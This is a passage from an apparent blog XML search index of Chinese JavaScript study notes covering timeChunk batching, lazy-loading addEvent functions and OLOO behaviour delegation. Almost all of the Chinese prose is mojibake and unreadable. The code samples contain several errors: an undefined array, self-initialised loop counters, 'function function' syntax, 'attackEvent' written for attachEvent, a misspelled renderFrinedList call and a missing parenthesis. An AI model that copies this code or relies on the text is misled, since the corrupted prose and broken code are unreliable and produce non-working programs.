function(ary,fn,count)&#123; var obj, t; var len = ary.length; var start = function()&#123; for(var i = 0; i &lt; Math.min(count || 1, ary.length); i++)&#123; var obj = ary.shift(); fn(obj); &#125; &#125; return function()&#123; t = setInterval(function()&#123; if(ary.length === 0)&#123; // å¦‚æžœèŠ‚ç‚¹å…¨éƒ¨åˆ›å»ºå¥½äº† return clearInterval(t); &#125; start(); &#125;,200); &#125;&#125;// æµ‹è¯•ï¼Œå‡è®¾æˆ‘ä»¬æœ‰ 1000 ä¸ªå¥½å‹çš„æ•°æ®ï¼Œæˆ‘ä»¬åˆ©ç”¨ timeChunk å‡½æ•°ï¼Œæ¯ä¸€æ‰¹åªå¾€é¡µé¢ä¸­åˆ›å»º 8 ä¸ªèŠ‚ç‚¹ï¼švar args = [];for(var i = i; i &lt;= 1000; i++)&#123; args.push(i);&#125;var renderFriendList = timeChunk(ary,function(n)&#123; var div = document.createElement('div'); div.innerHTML = n; document.body.appendChild(div);&#125;,8) renderFrinedList(); 5.æƒ°æ€§åŠ è½½å‡½æ•°åœ¨ Web å¼€å‘ä¸­ï¼Œå› ä¸ºæµè§ˆå™¨ä¹‹é—´çš„å®žçŽ°å·®å¼‚ï¼Œä¸€äº›å—…æŽ¢å·¥ä½œæ€»æ˜¯ä¸å¯é¿å…çš„ï¼Œæ¯”å¦‚æˆ‘ä»¬éœ€è¦ä¸€ä¸ªåœ¨å„ä¸ªæµè§ˆå™¨ä¸­èƒ½å¤Ÿé€šç”¨çš„äº‹ä»¶ç»‘å®šå‡½æ•° addEvent,å¸¸è§çš„æ–¹æ³•å¦‚ä¸‹ï¼š 12345678var addEvent = function(elem,type,handler)&#123; if(window.addEventListener)&#123; return elem.addEventListener(type,handler,false); &#125; if(window.attackEvent)&#123; return elem.attackEvent('on'+type,handler); &#125;&#125; è¿™ä¸ªå‡½æ•°çš„ç¼ºç‚¹æ˜¯ï¼Œå½“å®ƒæ¯æ¬¡è¢«è°ƒç”¨çš„æ—¶å€™éƒ½ä¼šæ‰§è¡Œé‡Œé¢çš„ if æ¡ä»¶åˆ†æ”¯ï¼Œè™½ç„¶æ‰§è¡Œè¿™äº› if åˆ†æ”¯çš„å¼€é”€ä¸ç®—å¤§ï¼Œä½†ä¹Ÿè®¸æœ‰ä¸€äº›æ–¹æ³•å¯ä»¥è®©ç¨‹åºé¿å…é‡å¤çš„æ‰§è¡Œè¿‡ç¨‹ã€‚ ç¬¬äºŒç§æ–¹æ¡ˆæ˜¯è¿™æ ·çš„ï¼Œæˆ‘ä»¬æŠŠå—…æŽ¢æµè§ˆå™¨çš„æ“ä½œæå‰åˆ°ä»£ç åŠ è½½çš„æ—¶å€™ã€‚åœ¨ä»£ç åŠ è½½çš„æ˜¯å°±ç«‹åˆ»è¿›è¡Œä¸€æ¬¡åˆ¤æ–­ï¼Œä»¥ä¾¿è®© addEvent è¿”å›žä¸€ä¸ªåŒ…è£¹äº†æ­£ç¡®é€»è¾‘çš„å‡½æ•°ã€‚ä»£ç å¦‚ä¸‹ï¼š 123456789101112var addEvent = (function()&#123; if(window.addEventListener)&#123; return function function(elem,type,handler)&#123; elem.addEventListener(type,handler,false); &#125; &#125; if(window.attackEvent)&#123; return function function(elem,type,handler)&#123; elem.attackEvent('on'+type,handler); &#125; &#125; &#125;)(); ç›®å‰çš„ addEvent å‡½æ•°ä¾ç„¶æœ‰ä¸ªç¼ºç‚¹ï¼Œä¹Ÿè®¸æˆ‘ä»¬ä»Žå¤´åˆ°å°¾éƒ½æ²¡æœ‰ä½¿ç”¨è¿‡ addEvent å‡½æ•°ï¼Œè¿™æ ·çœ‹æ¥ï¼Œå‰ä¸€æ¬¡çš„æµè§ˆå™¨å—…æŽ¢å°±æ˜¯å®Œå…¨å¤šä½™çš„æ“ä½œï¼Œè€Œä¸”è¿™ä¹Ÿä¼šç¨ç¨å»¶é•¿é¡µé¢ ready çš„æ—¶é—´ã€‚ ç¬¬ä¸‰ç§æ–¹æ¡ˆå°±æ˜¯æƒ°æ€§è½½å…¥å‡½æ•°æ–¹æ¡ˆï¼Œæ­¤æ—¶ addEvent ä¾ç„¶è¢«å£°æ˜Žä¸ºä¸€ä¸ªæ™®é€šå‡½æ•°ï¼Œåœ¨å‡½æ•°é‡Œé¢ä¾ç„¶æœ‰ä¸€äº›åˆ†æ”¯åˆ¤æ–­ã€‚ä½†æ˜¯åœ¨ç¬¬ä¸€æ¬¡è¿›å…¥æ¡ä»¶åˆ†æ”¯ä¹‹åŽï¼Œåœ¨å‡½æ•°å†…éƒ¨ä¼šé‡å†™è¿™ä¸ªå‡½æ•°ï¼Œé‡å†™ä¹‹åŽçš„å‡½æ•°å°±æ˜¯æˆ‘ä»¬æœŸæœ›çš„ addEvent å‡½æ•°ï¼Œåœ¨ä¸‹ä¸€æ¬¡è¿›åŽ» addEvent å‡½æ•°çš„æ—¶å€™ï¼ŒaddEvent å‡½æ•°é‡Œé¢å°±ä¸å­˜åœ¨åˆ†æ”¯è¯­å¥äº†ï¼š 12345678910111213var addEvent = function(elem,type,handler)&#123; if(window.addEventListener)&#123; addEvent = function function(elem,type,handler)&#123; elem.addEventListener(type,handler,false); &#125; &#125; else if(window.attackEvent)&#123; addEvent = function function(elem,type,handler)&#123; elem.attackEvent('on'+type,handler); &#125; &#125; addEvent(elem,type,handler);&#125; å°ç»“åœ¨è¿›å…¥è®¾è®¡æ¨¡å¼çš„å­¦ä¹ ä¹‹å‰ï¼Œæœ¬ç« æŒ‘é€‰äº†é—­åŒ…å’Œé«˜é˜¶å‡½æ•°æ¥è¿›è¡Œè®²è§£ã€‚è¿™æ˜¯å› ä¸ºåœ¨ JavaScriptå¼€å‘ä¸­ï¼Œé—­åŒ…å’Œé«˜é˜¶å‡½æ•°çš„åº”ç”¨æžå¤šã€‚å°±è®¾è®¡æ¨¡å¼è€Œè¨€ï¼Œå› ä¸º JavaScript è¿™é—¨è¯­è¨€çš„è‡ªèº«ç‰¹ç‚¹ï¼Œè®¸å¤šè®¾è®¡æ¨¡å¼åœ¨ JavaScript ä¹‹ä¸­çš„å®žçŽ°è·Ÿåœ¨ä¸€äº›ä¼ ç»Ÿé¢å‘å¯¹è±¡è¯­è¨€ä¸­çš„å®žçŽ°ç›¸å·®å¾ˆå¤§ã€‚åœ¨JavaScript ä¸­ï¼Œå¾ˆå¤šè®¾è®¡æ¨¡å¼éƒ½æ˜¯é€šè¿‡é—­åŒ…å’Œé«˜é˜¶å‡½æ•°å®žçŽ°çš„ã€‚è¿™å¹¶ä¸å¥‡æ€ªï¼Œç›¸å¯¹äºŽæ¨¡å¼çš„å®žçŽ°è¿‡ç¨‹ï¼Œæˆ‘ä»¬æ›´å…³æ³¨çš„æ˜¯æ¨¡å¼å¯ä»¥å¸®åŠ©æˆ‘ä»¬å®Œæˆä»€ä¹ˆ]]></content>
      <categories>
        <category>JavaScriptè®¾è®¡æ¨¡å¼</category>
      </categories>
      <tags>
        <tag>JavaScriptè®¾è®¡æ¨¡å¼</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä½ ä¸çŸ¥é“çš„JavaScript(ä¸Š)â€”â€”è¡Œä¸ºå§”æ‰˜]]></title>
    <url>%2F2019-01-23-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JavaScript(%E4%B8%8A)%E2%80%94%E2%80%94%E8%A1%8C%E4%B8%BA%E5%A7%94%E6%89%98.html</url>
    <content type="text"><![CDATA[è¿™ä¸ªç³»åˆ—çš„ä½œå“æ˜¯ä¸Šä¸€æ¬¡å½“å½“ç½‘æœ‰æ´»åŠ¨ä¹°çš„ï¼Œè®°å¾—æ˜¯ä¸Šä¸€å¹´ä¹æœˆä»½å¼€å­¦å­£çš„æ—¶å€™äº†ã€‚åŽé¢ä¸€ç›´æœ‰å…¶ä»–çš„äº‹æƒ…ï¼Œæˆ–è€…è‡ªèº«ä¸€äº›å› ç´ ï¼Œè¿Ÿè¿Ÿæ²¡æœ‰å¼€å°è¿™æœ¬ä¹¦ã€‚ä»Šå¤©ç«‹ä¸‹ä¸€ä¸ª flagï¼Œå¸Œæœ›å¯ä»¥åœ¨ä¸¤ä¸ªæœˆå†…çœ‹å®Œå¹¶è®°å½•è¿™ä¸ªç³»åˆ—çš„ä¸‰æœ¬ä¹¦ï¼Œä¿æŒå­¦ä¹ çš„æ¿€æƒ…ï¼Œä¸æ–­å¼¥è¡¥è‡ªå·±çš„åŸºç¡€ä¸å¤Ÿæ‰Žå®žçš„ç¼ºç‚¹ã€‚ ä½œè€…çš„github ä¹¦ç±çš„è´­ä¹°é“¾æŽ¥ï¼Œè‡ªå·±æœã€‚ ä½ ä¸çŸ¥é“çš„JavaScript(ä¸Š)â€”â€”è¡Œä¸ºå§”æ‰˜å›žé¡¾ä¸Šä¸€ç« çš„ç†è®ºï¼š[[Prototype]] æœºåˆ¶å°±æ˜¯æŒ‡å¯¹è±¡ä¸­çš„ä¸€ä¸ªå†…éƒ¨é“¾æŽ¥å¼•ç”¨å¦ä¸€ä¸ªå¯¹è±¡ã€‚ å¦‚æžœåœ¨ç¬¬ä¸€ä¸ªå¯¹è±¡ä¸Šæ²¡æœ‰æ‰¾åˆ°éœ€è¦çš„å±žæ€§æˆ–è€…æ–¹æ³•å¼•ç”¨ï¼Œå¼•æ“Žå°±ä¼šç»§ç»­åœ¨ [[Prototype]] å…³è”çš„å¯¹è±¡ä¸Šè¿›è¡ŒæŸ¥æ‰¾ã€‚åŒç†ï¼Œå¦‚æžœåœ¨åŽè€…ä¸­ä¹Ÿæ²¡æœ‰æ‰¾åˆ°éœ€è¦çš„å¼•ç”¨å°±ä¼šç»§ç»­æŸ¥æ‰¾å®ƒçš„ [[Prototype]] ,ä»¥æ­¤ç±»æŽ¨ï¼Œè¿™ä¸€ç³»åˆ—å¯¹è±¡çš„é“¾æŽ¥è¢«ç§°ä¸ºâ€œåŽŸåž‹é“¾â€ã€‚ æ¢å¥è¯è¯´ï¼ŒJavaScript ä¸­è¿™ä¸ªæœºåˆ¶çš„æœ¬è´¨å°±æ˜¯å¯¹è±¡ä¹‹é—´çš„å…³è”å…³ç³»ã€‚ é¢å‘å§”æ‰˜çš„è®¾è®¡è¯•ç€æŠŠæ€è·¯ä»Žç±»å’Œç»§æ‰¿çš„è®¾è®¡æ¨¡å¼è½¬æ¢åˆ°å§”æ‰˜è¡Œä¸ºçš„è®¾è®¡æ¨¡å¼ã€‚ ç±»ç†è®ºå‡è®¾æˆ‘ä»¬éœ€è¦åœ¨è½¯ä»¶ä¸­å»ºæ¨¡ä¸€äº›ç±»ä¼¼çš„ä»»åŠ¡ï¼ˆâ€œXYZâ€ï¼Œâ€œABCâ€ç­‰ï¼‰ã€‚ å¦‚æžœä½¿ç”¨ç±»ï¼Œé‚£è®¾è®¡æ–¹æ³•å¯èƒ½æ˜¯è¿™æ ·çš„ï¼šå®šä¹‰ä¸€ä¸ªé€šç”¨çˆ¶ï¼ˆåŸºï¼‰ç±»ï¼Œå¯ä»¥å°†å…¶å‘½åä¸º Task,åœ¨ Task ç±»ä¸­å®šä¹‰æ‰€æœ‰ä»»åŠ¡éƒ½æœ‰çš„è¡Œä¸ºã€‚æŽ¥ç€å®šä¹‰å­ç±» XYZ å’Œ ABCï¼Œå®ƒä»¬éƒ½ç»§æ‰¿è‡ª Task å¹¶ä¸”æ·»åŠ ä¸€äº›ç‰¹æ®Šçš„è¡Œä¸ºæ¥å¤„ç†å¯¹åº”çš„ä»»åŠ¡ã€‚ éžå¸¸é‡è¦çš„æ˜¯ï¼Œç±»è®¾è®¡æ¨¡å¼é¼“åŠ±ä½ åœ¨ç»§æ‰¿æ—¶ä½¿ç”¨æ–¹æ³•é‡å†™ï¼ˆå’Œå¤šæ€ï¼‰ï¼Œæ¯”å¦‚åœ¨ XYZ ä»»åŠ¡ä¸­é‡å†™ Task ä¸­å®šä¹‰çš„ä¸€äº›é€šç”¨çš„æ–¹æ³•ï¼Œç”šè‡³åœ¨æ·»åŠ æ–°è¡Œä¸ºæ—¶é€šè¿‡ super è°ƒç”¨è¿™ä¸ªæ–¹æ³•çš„åŽŸå§‹ç‰ˆæœ¬ã€‚ä½ ä¼šå‘çŽ°è®¸å¤šè¡Œä¸ºå¯ä»¥å…ˆ â€œæŠ½è±¡â€åˆ°çˆ¶ç±»ç„¶åŽå†ç”¨å­ç±»è¿›è¡Œç‰¹æ®ŠåŒ–ï¼ˆé‡å†™ï¼‰ã€‚ ä¸‹é¢çš„æ˜¯å¯¹åº”çš„ä¼ªä»£ç ï¼š 123456789101112131415class Task&#123; id: // æž„é€ å‡½æ•° Task() Task(ID)&#123;id = ID&#125; outputTask()&#123;output(id);&#125;&#125;class XYZ inherits Task&#123; label; // æž„é€ å‡½æ•° XYZ() XYZ(ID,Label)&#123;super(ID);label = Label&#125; outputTask()&#123;super(); output(label)&#125;&#125;class ABC inherits Task&#123; //..&#125; çŽ°åœ¨å¯ä»¥å®žä¾‹åŒ–å­ç±» XYZ çš„ä¸€äº›å‰¯æœ¬ç„¶åŽä½¿ç”¨è¿™äº›å®žä¾‹æ¥æ‰§è¡Œä»»åŠ¡ â€œXYZâ€ã€‚è¿™äº›å®žä¾‹ä¼šå¤åˆ¶ Task å®šä¹‰çš„é€šç”¨è¡Œä¸ºä»¥åŠ XYZ å®šä¹‰çš„ç‰¹æ®Šè¡Œä¸ºã€‚åŒç†ï¼ŒABC ç±»çš„å®žä¾‹ä¹Ÿä¼šå¤åˆ¶ Task çš„è¡Œä¸ºå’Œ ABC çš„è¡Œä¸ºã€‚åœ¨æž„é€ å®ŒæˆåŽï¼Œä½ é€šå¸¸åªéœ€è¦æ“ä½œè¿™äº›å®žä¾‹ï¼ˆè€Œä¸æ˜¯ç±»ï¼‰ï¼Œå› ä¸ºæ¯ä¸ªå®žä¾‹éƒ½æœ‰ä½ éœ€è¦å®Œæˆä»»åŠ¡çš„æ‰€æœ‰è¡Œä¸ºã€‚ å§”æ‰˜ç†è®ºçŽ°åœ¨æˆ‘ä»¬è¯•ç€ç”¨å§”æ‰˜è¡Œä¸ºæ¥æ€è€ƒåŒæ ·çš„é—®é¢˜ã€‚ é¦–å…ˆä½ ä¼šå®šä¹‰ä¸€ä¸ªåä¸º Task çš„å¯¹è±¡ï¼ˆå®ƒæ—¢ä¸æ˜¯å¯¹è±¡ä¹Ÿä¸æ˜¯å‡½æ•°ï¼‰ï¼Œå®ƒä¼šåŒ…å«æ‰€æœ‰ä»»åŠ¡éƒ½å¯ä»¥ä½¿ç”¨ï¼ˆå†™ä½œä½¿ç”¨ï¼Œè¯»ä½œå§”æ‰˜ï¼‰çš„å…·ä½“è¡Œä¸ºã€‚æŽ¥ç€ï¼Œå¯¹äºŽæ¯ä¸ªä»»åŠ¡ï¼ˆâ€œXYZâ€,â€ABCâ€ï¼‰ä½ éƒ½ä¼šå®šä¹‰ä¸€ä¸ªå¯¹è±¡æ¥å­˜å‚¨å¯¹åº”çš„æ•°æ®å’Œè¡Œä¸ºã€‚æŠŠç‰¹å®šçš„ä»»åŠ¡å¯¹è±¡éƒ½å…³è”åˆ° Task åŠŸèƒ½å¯¹è±¡ä¸Šï¼Œè®©å®ƒä»¬åœ¨éœ€è¦çš„æ—¶å€™å¯ä»¥è¿›è¡Œå§”æ‰˜ã€‚ åŸºæœ¬ä¸Šå¯ä»¥æƒ³è±¡æˆï¼Œæ‰§è¡Œä»»åŠ¡çš„ â€œXYZâ€ éœ€è¦ä¸¤ä¸ªå¯¹è±¡ï¼ˆXYZ å’Œ Taskï¼‰åä½œå®Œæˆï¼Œä½†æ˜¯æˆ‘ä»¬å¹¶ä¸éœ€è¦è¿™äº›è¡Œä¸ºæ”¾åœ¨ä¸€èµ·ï¼Œé€šè¿‡ç±»çš„å¤åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå®ƒä»¬åˆ†åˆ«æ”¾åœ¨å„è‡ªç‹¬ç«‹çš„å¯¹è±¡ä¸­ï¼Œéœ€è¦æ—¶å¯ä»¥è¿è¡Œ XYZ å¯¹è±¡å§”æ‰˜ç»™ Taskã€‚ ä¸‹é¢æ˜¯æŽ¨èçš„ä»£ç å½¢å¼ï¼Œéžå¸¸ç®€å•ï¼š 1234567891011121314151617Task = &#123; setID:function(ID)&#123;this.id = ID&#125;, outputID:function)&#123;console.log(this.id)&#125;&#125;// è®© XYZ å§”æ‰˜ TaskXYZ = Object.create(Task);XYZ.prepareTask = function(ID,Label)&#123; this.setID(); this.label = Label;&#125;XYZ.outputTaskDetails = function()&#123; this.outputID(); console.log(this.label);&#125;// ABC = Object.create(Task);// ABC .. = ... è¿™æ®µä»£ç ä¸­ï¼ŒTask å’Œ XYZ å¹¶ä¸æ˜¯ç±»ï¼ˆæˆ–è€…å‡½æ•°ï¼‰ï¼Œå®ƒä»¬æ˜¯å¯¹è±¡ã€‚XYZ é€šè¿‡ Object.create(..) åˆ›å»ºï¼Œå®ƒçš„ [[Prototype]] å§”æ‰˜äº†å¯¹è±¡ã€‚ ç›¸æ¯”äºŽé¢å‘ç±»ï¼ˆæˆ–è€…è¯´é¢å‘å¯¹è±¡ï¼‰ï¼Œä½œè€…ä¼šæŠŠè¿™ç§ç¼–ç é£Žæ ¼ç§°ä¸ºâ€œå¯¹è±¡å…³è”â€ï¼ˆOLOOï¼Œobject linked to other objectsï¼‰ã€‚æˆ‘ä»¬çœŸæ­£å…³å¿ƒçš„æ˜¯ XYZ å¯¹è±¡ï¼ˆå’Œ ABC å¯¹è±¡ï¼‰å§”æ‰˜äº† Task å¯¹è±¡ã€‚ åœ¨ JavaScript ä¸­ï¼Œ[[Prototype]] æœºåˆ¶ä¼šæŠŠå¯¹è±¡å…³è”åˆ°å…¶ä»–å¯¹è±¡ã€‚ å¯¹è±¡å…³è”é£Žæ ¼çš„ä»£ç è¿˜æœ‰ä¸€äº›ä¸è¶³ä¹‹å¤„ï¼š åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œid å’Œ label æ•°æ®æˆå‘˜éƒ½æ˜¯ç›´æŽ¥å­˜åœ¨ XYZ ä¸Šï¼ˆè€Œä¸æ˜¯ Taskï¼‰ï¼Œé€šå¸¸æ¥è¯´ï¼Œ[[Prototype]] å§”æ‰˜ä¸­æœ€å¥½æŠŠçŠ¶æ€ä¿å­˜åœ¨å§”æ‰˜è€…ï¼ˆXYZã€ABCï¼‰è€Œä¸æ˜¯å§”æ‰˜ç›®æ ‡ï¼ˆTaskï¼‰ä¸Šã€‚ åœ¨ç±»è®¾è®¡æ¨¡å¼ä¸­ï¼Œæ•…æ„è®©çˆ¶ç±»ï¼ˆTaskï¼‰å’Œå­ç±»ï¼ˆXYZï¼‰ä¸­éƒ½æœ‰ outputTask æ–¹æ³•ï¼Œè¿™æ ·å°±å¯ä»¥åˆ©ç”¨é‡å†™ï¼ˆå¤šæ€ï¼‰çš„ä¼˜åŠ¿ï¼Œåœ¨å§”æ‰˜è¡Œä¸ºä¸­åˆ™æ°å¥½ç›¸åï¼Œæˆ‘ä»¬ä¼šå°½é‡é¿å…åœ¨ [[Prototype]] é“¾çš„ä¸åŒçº§åˆ«ä½¿ç”¨ç›¸åŒçš„å‘½åï¼Œå¦åˆ™å°±éœ€è¦ä½¿ç”¨ç¬¨æ‹™å¹¶ä¸”è„†å¼±çš„è¯­æ³•æ¥æ¶ˆé™¤å¼•ç”¨æ­§ä¹‰ã€‚ è¿™ä¸ªè®¾è®¡æ¨¡å¼è¦æ±‚å°±è¿›æ¥å°‘ä½¿ç”¨å®¹æ˜“è¢«é‡å†™çš„é€šç”¨æ–¹æ³•åï¼Œæå€¡ä½¿ç”¨æ›´æœ‰æè¿°æ€§çš„æ–¹æ³•åï¼Œå°¤å…¶æ˜¯å†™æ¸…ç›¸å¯¹å¯¹è±¡è¡Œä¸ºçš„ç±»åž‹ã€‚è¿™æ ·åšå®žé™…ä¸Šå¯ä»¥åˆ›å»ºå‡ºæ›´å®¹æ˜“ç†è§£å’Œç»´æŠ¤çš„ä»£ç ã€‚å› ä¸ºæ–¹æ³•åï¼ˆä¸ä»…åœ¨å®šä¹‰çš„ä½ç½®ï¼Œè€Œæ˜¯è´¯ç©¿æ•´ä¸ªä»£ç ï¼‰æ›´åŠ æ¸…æ™°ï¼ˆè‡ªæ–‡æ¡£ï¼‰ã€‚ this.setID(ID),XYZ ä¸­çš„æ–¹æ³•é¦–å…ˆä¼šå¯»æ‰¾ XYZ è‡ªèº«æ˜¯å¦æœ‰ setID(..)ï¼Œä½†æ˜¯ XYZ ä¸­å¹¶æ²¡æœ‰æ•´ä¸ªæ–¹æ³•åï¼Œå› ä¸ºä¼šé€šè¿‡ [[Prototype]] å§”æ‰˜å…³è”åˆ° Task ç»§ç»­å¯»æ‰¾ï¼Œè¿™æ—¶å°±å¯ä»¥æ‰¾åˆ° setID(..) æ•´ä¸ªæ–¹æ³•ã€‚æ­¤å¤–ï¼Œç”±äºŽè°ƒç”¨ä½ç½®è§¦å‘äº† this çš„éšå¼ç»‘å®šè§„åˆ™ï¼Œå› æ­¤è™½ç„¶ setID(..) æ–¹æ³•åœ¨ Task ä¸­ï¼Œè¿è¡Œæ—¶ this ä»ç„¶ä¼šç»‘å®šåˆ° XYZï¼Œè¿™æ­£æ˜¯æˆ‘ä»¬æƒ³è¦çš„ã€‚åŽé¢çš„outputID(..) ä¹Ÿæ˜¯åŒæ ·çš„åŽŸç†ã€‚ æ¢å¥è¯è¯´ï¼Œæˆ‘ä»¬å’Œ XYZ è¿›è¡Œäº¤äº’æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ Task ä¸­é€šç”¨çš„æ–¹æ³•ï¼Œå› ä¸º XYZ å§”æ‰˜äº† Task. å§”æ‰˜è¡Œä¸ºæ„å‘³ç€æŸäº›å¯¹è±¡ï¼ˆXYZï¼‰åœ¨æ‰¾ä¸åˆ°å±žæ€§æˆ–è€…æ–¹æ³•å¼•ç”¨æ—¶ä¼šæŠŠè¿™ä¸ªè¯·æ±‚å§”æ‰˜ç»™å¦ä¸€ä¸ªå¯¹è±¡ï¼ˆTaskï¼‰. è¿™ä¸ªæ˜¯ä¸€ç§æžå…¶å¼ºå¤§çš„è®¾è®¡æ¨¡å¼ï¼Œå’Œçˆ¶ç±»ã€å­ç±»ã€ç»§æ‰¿ã€å¤šæ€ç­‰æ¦‚å¿µå®Œå…¨ä¸åŒã€‚å¯¹è±¡å¹¶ä¸æ˜¯æŒ‰ç…§çˆ¶ç±»åˆ°å­ç±»çš„å…³ç³»åž‚ç›´ç»„ç»‡çš„ï¼Œè€Œæ˜¯é€šè¿‡ä»»æ„æ–¹æ³•çš„å§”æ‰˜å¹¶æŽ’ç»„ç»‡çš„ã€‚ åœ¨ API æŽ¥å£çš„è®¾è®¡ä¸­ï¼Œå§”æ‰˜æœ€å¥½åœ¨å†…éƒ¨å®žçŽ°ï¼Œä¸ç”¨ç›´æŽ¥æš´éœ²å‡ºåŽ»ã€‚åœ¨ä¹‹å‰çš„ä¾‹å­ä¸­æˆ‘ä»¬æ²¡æœ‰è®©å¼€å‘è€…é€šè¿‡ API ç›´æŽ¥è°ƒç”¨ XYZ.setID()ï¼ˆå½“ç„¶ï¼Œå¯ä»¥è¿™ä¹ˆåšï¼‰ã€‚ç›¸åï¼Œæˆ‘ä»¬æŠŠå§”æ‰˜éšè—äº†åœ¨ API å†…éƒ¨ï¼ŒXYZ.propareTas() ä¼šå§”æ‰˜ Task.setID(..)ã€‚ 1.ç›¸äº’å§”æ‰˜( ç¦æ­¢)ä½ æ— æ³•åœ¨ä¸¤ä¸ªæˆ–ä¸¤ä¸ªä»¥ä¸Šäº’ç›¸ï¼ˆåŒå‘ï¼‰å§”æ‰˜çš„å¯¹è±¡ä¹‹é—´åˆ›å»ºå¾ªçŽ¯å§”æ‰˜ã€‚å¦‚æžœä½ æŠŠ B å…³è”åˆ° A ç„¶åŽè¯•ç€æŠŠ A å…³è”åˆ° Bï¼Œå°±ä¼šå‡ºçŽ°ã€‚ è¿™ç§æ–¹æ³•æ˜¯ç¦æ­¢çš„ã€‚å¦‚æžœä½ å¼•ç”¨äº†ä¸€ä¸ªä¸¤è¾¹éƒ½ä¸å­˜åœ¨çš„å±žæ€§æˆ–è€…æ˜¯æ–¹æ³•ï¼Œé‚£å°±ä¼šåœ¨ [[Prototype]] é“¾ä¸Šäº§ç”Ÿä¸€ä¸ªæ— é™é€’å½’çš„å¾ªçŽ¯ã€‚ä½†æ˜¯å¦‚æžœæ‰€æœ‰çš„å¼•ç”¨éƒ½è¢«ä¸¥æ ¼é™åˆ¶çš„è¯ï¼ŒBæ˜¯å¯ä»¥å§”æ‰˜ Açš„ï¼Œåä¹‹äº¦ç„¶ã€‚å› ä¸ºï¼Œäº’ç›¸å§”æ‰˜ç†è®ºä¸Šæ˜¯å¯ä»¥æ­£å¸¸å·¥ä½œçš„ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹è¿™æ˜¯éžå¸¸æœ‰ç”¨çš„ã€‚ ä¹‹æ‰€ä»¥è¦ç¦æ­¢äº’ç›¸å§”æ‰˜ï¼Œæ˜¯å› ä¸ºå¼•æ“Žçš„å¼€å‘è€…å‘çŽ°åœ¨è®¾ç½®æ—¶æ£€æŸ¥ï¼ˆå¹¶ç¦æ­¢ï¼‰ä¸€æ¬¡æ— é™å¾ªçŽ¯å¼•ç”¨è¦æ›´åŠ é«˜æ•ˆï¼Œå¦åˆ™æ¯æ¬¡ä»Žå¯¹è±¡ä¸­æŸ¥æ‰¾å±žæ€§æ—¶éƒ½éœ€è¦è¿›è¡Œæ£€æŸ¥ã€‚ 2.è°ƒè¯•é€šå¸¸æ¥è¯´ï¼ŒJavaScript è§„èŒƒå¹¶ä¸ä¼šæŽ§åˆ¶æµè§ˆå™¨ä¸­å¼€å‘è€…å¯¹äºŽç‰¹å®šå€¼æˆ–è€…ç»“æž„çš„è¡¨è¾¾æ–¹å¼ï¼Œæµè§ˆå™¨å’Œå¼•æ“Žå¯ä»¥è‡ªå·±é€‰æ‹©åˆé€‚çš„æ–¹å¼æ¥è§£æžï¼Œå› æ­¤æµè§ˆå™¨å’Œå·¥å…·çš„è§£æžç»“æž„å¹¶ä¸ä¸€å®šç›¸åŒã€‚æ¯”å¦‚ä¸‹é¢çš„è¿™æ®µä»£ç çš„ç»“æžœåªèƒ½åœ¨è°·æ­Œçš„å¼€å‘è€…å·¥å…·ä¸­çœ‹åˆ°ã€‚ è¿™æ®µä¼ ç»Ÿçš„â€œç±»æž„é€ å‡½æ•°â€ JavaScript ä»£ç åœ¨è°·æ­Œå¼€å‘è€…å·¥å…·çš„æŽ§åˆ¶å°ä¸­ç»“æžœæ˜¯è¿™æ ·çš„ï¼š 1234function Foo()&#123;&#125;var a1 = new Foo();a1; // Foo&#123;&#125;// åœ¨ FireFox ä¸­è¿è¡Œå´æ˜¯ Object&#123;&#125; è°·æ­Œæµè§ˆå™¨æƒ³è¯´çš„ â€œ{ } æ˜¯ä¸€ä¸ªç©ºå¯¹è±¡ï¼Œç”±åä¸º Foo çš„å‡½æ•°æž„é€ â€ï¼ŒFirefox æƒ³è¯´çš„æ˜¯ â€œ{} æ˜¯ä¸€ä¸ªç©ºå¯¹è±¡ï¼Œç”±Object æž„é€ â€ï¼Œä¹‹æ‰€æœ‰æœ‰è¿™ç§ç»†å¾®çš„å·®åˆ«ï¼Œæ˜¯å› ä¸ºè°·æ­Œä¼šåŠ¨æ€è·Ÿè¸ªå¹¶æŠŠå®žé™…æž„é€ è¿‡ç¨‹çš„å‡½æ•°å½“åšä¸€ä¸ªå†…ç½®å±žæ€§ï¼Œä½†æ˜¯å…¶ä»–æµè§ˆå™¨å¹¶ä¸ä¼šè·Ÿè¸ªè¿™äº›é¢å¤–çš„ä¿¡æ¯ã€‚ å¯ä»¥ç”¨ JavaScript ä¸­çš„æœºåˆ¶æ¥è§£é‡Šä¸€äº›è°·æ­Œçš„è·Ÿè¸ªåŽŸç†ï¼š 1234function Foo()&#123;&#125;var a1 = new Foo();a1.constructor(); // Foo()&#123;&#125;a1.constructor.name; //"Foo" è°·æ­Œæ˜¯ä¸æ˜¯ç›´æŽ¥è¾“å‡ºäº†å¯¹è±¡çš„ .constructor.name ï¼Ÿä»¤äººè¿·æƒ‘çš„æ˜¯ï¼Œç­”æ¡ˆæ—¢æ˜¯åˆä¸æ˜¯ã€‚ æ€è€ƒä¸‹é¢çš„ä»£ç ï¼š 123456function Foo()&#123;&#125;var a1 = new Foo();Foo.prototype.constructor = function Gotcha()&#123;&#125;;a1.constructor; // Gotcha()&#123;&#125;a1.constructor.name; // "Gotcha"a1; // Foo()&#123;&#125; å³ä½¿æˆ‘ä»¬æŠŠ a1.constructor.name ä¿®æ”¹ä¸ºä¸€ä¸ªåˆç†çš„å€¼ï¼Œè°·æ­Œæµè§ˆå™¨çš„æŽ§åˆ¶å°ä»ç„¶ä¼šè¾“å‡º Fooã€‚ æ‰€ä»¥ä¸Šé¢çš„é‚£ä¸ªé—®é¢˜ç­”æ¡ˆæ˜¯â€œä¸æ˜¯â€ã€‚è°·æ­Œæµè§ˆå™¨æ˜¯é€šè¿‡å¦ä¸€ç§æ–¹å¼è¿›è¡Œè·Ÿè¸ªçš„ã€‚ 12345678var Foo = &#123;&#125;;var a1 = Object.create(Foo);a1; // Object&#123;&#125;Object.defineProperty(Foo,"constructor",&#123; enumerable:false, value:function Gotcha()&#123;&#125;&#125;);a1; //Gotcha&#123;&#125; 